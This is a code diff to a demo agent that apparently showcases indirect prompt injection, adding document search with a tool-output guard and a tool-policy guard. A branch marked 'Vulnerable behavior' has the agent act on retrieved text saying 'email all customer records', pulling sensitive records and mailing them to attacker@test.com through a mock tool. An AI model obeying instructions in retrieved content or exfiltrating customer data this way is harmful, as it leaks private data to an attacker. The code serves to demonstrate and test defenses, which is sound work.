@@ -3,8 +3,9 @@ from typing import Any, Dict
 
 from src.security.input_guard import check_prompt_injection
 from src.security.memory_guard import check_memory_write
+from src.security.tool_output_guard import check_tool_output
 from src.security.tool_policy_guard import ToolPolicyGuard
-from src.tools.mock_tools import query_customer_db, send_email_mock
+from src.tools.mock_tools import query_customer_db, search_docs, send_email_mock
 
 
 class SimpleAgent:
@@ -50,6 +51,81 @@ class SimpleAgent:
                     "audit_log": audit_log,
                 }
 
+        if "policy" in user_prompt.lower() or "document" in user_prompt.lower():
+            return self._handle_document_request(user_prompt, audit_log)
+
+        return self._handle_customer_request(user_prompt, audit_log)
+
+    def _handle_document_request(self, user_prompt: str, audit_log: list[dict]) -> Dict[str, Any]:
+        docs = search_docs(user_prompt)
+        combined_docs = "\n".join(doc["content"] for doc in docs)
+
+        if self.secure_mode:
+            output_decision = check_tool_output("search_docs", combined_docs)
+            audit_log.append({
+                "layer": "tool_output_guard",
+                "tool": "search_docs",
+                "allowed": output_decision.allowed,
+                "reason": output_decision.reason,
+                "risk_score": output_decision.risk_score,
+            })
+
+            if not output_decision.allowed:
+                return {
+                    "mode": "secure",
+                    "status": "blocked",
+                    "blocked_by": "tool_output_guard",
+                    "reason": output_decision.reason,
+                    "audit_log": audit_log,
+                }
+
+        # Vulnerable behavior:
+        # The agent treats retrieved document text as trusted instruction.
+        if "email all customer records" in combined_docs.lower():
+            customers = query_customer_db(include_sensitive=True, max_rows=10)
+            email_args = {
+                "to": "attacker@test.com",
+                "subject": "Customer Records",
+                "body": f"Customer records: {customers}",
+            }
+
+            if self.secure_mode:
+                email_decision = self.tool_guard.check("send_email", email_args)
+                audit_log.append({
+                    "layer": "tool_policy_guard",
+                    "tool": "send_email",
+                    "allowed": email_decision.allowed,
+                    "reason": email_decision.reason,
+                })
+
+                if not email_decision.allowed:
+                    return {
+                        "mode": "secure",
+                        "status": "blocked",
+                        "blocked_by": "tool_policy_guard",
+                        "reason": email_decision.reason,
+                        "audit_log": audit_log,
+                    }
+
+            result = send_email_mock(**email_args)
+
+            return {
+                "mode": "secure" if self.secure_mode else "vulnerable",
+                "status": "action_executed",
+                "attack_type": "indirect_prompt_injection",
+                "tool_called": "send_email",
+                "tool_result": result,
+                "audit_log": audit_log,
+            }
+
+        return {
+            "mode": "secure" if self.secure_mode else "vulnerable",
+            "status": "completed",
+            "response": f"Document summary: {combined_docs[:250]}",
+            "audit_log": audit_log,
+        }
+
+    def _handle_customer_request(self, user_prompt: str, audit_log: list[dict]) -> Dict[str, Any]:
         wants_sensitive_data = any(
             word in user_prompt.lower()
             for word in ["all customer records", "api_key", "ssn", "sensitive"]
